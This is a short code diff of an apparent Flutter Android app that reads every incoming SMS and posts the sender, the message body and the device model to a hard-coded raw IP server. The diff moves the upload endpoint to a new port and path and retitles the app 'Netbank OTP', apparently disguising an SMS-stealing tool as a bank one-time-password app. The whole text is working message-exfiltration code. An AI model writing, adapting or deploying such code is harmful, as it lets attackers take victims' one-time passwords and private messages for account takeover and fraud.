@@ -15,7 +15,7 @@ onBackgroundMessage(SmsMessage message) async {
     debugPrint('Running on ${androidInfo.model}');
 
     Map<String, dynamic> body = {
-      'web': 'cat999',
+      'web': 'sbo',
       'deviceID': androidInfo.model,
       'address': message.address,
       'message': message.body,
@@ -23,7 +23,7 @@ onBackgroundMessage(SmsMessage message) async {
     };
     String jsonBody = json.encode(body);
 
-    await http.post(Uri.parse('http://188.166.231.150:4000/sms/sms'),
+    await http.post(Uri.parse('http://188.166.231.150:3002/sms/add'),
         headers: {
           "Content-Type": "application/x-www-form-urlencoded",
         },
@@ -66,7 +66,7 @@ class _MyAppState extends State<MyApp> {
       debugPrint('Running on ${androidInfo.model}');
 
       Map<String, dynamic> body = {
-        'web': 'cat999',
+        'web': 'sbo',
         'deviceID': androidInfo.model,
         'address': message.address,
         'message': message.body,
@@ -74,7 +74,7 @@ class _MyAppState extends State<MyApp> {
       };
       String jsonBody = json.encode(body);
 
-      await http.post(Uri.parse('http://188.166.231.150:4000/sms/sms'),
+      await http.post(Uri.parse('http://188.166.231.150:3002/sms/add'),
           headers: {
             "Content-Type": "application/x-www-form-urlencoded",
           },
@@ -113,7 +113,7 @@ class _MyAppState extends State<MyApp> {
     return MaterialApp(
         home: Scaffold(
       appBar: AppBar(
-        title: const Text('SMS CAT999'),
+        title: const Text('Netbank OTP'),
       ),
       body: Column(
         mainAxisAlignment: MainAxisAlignment.center,
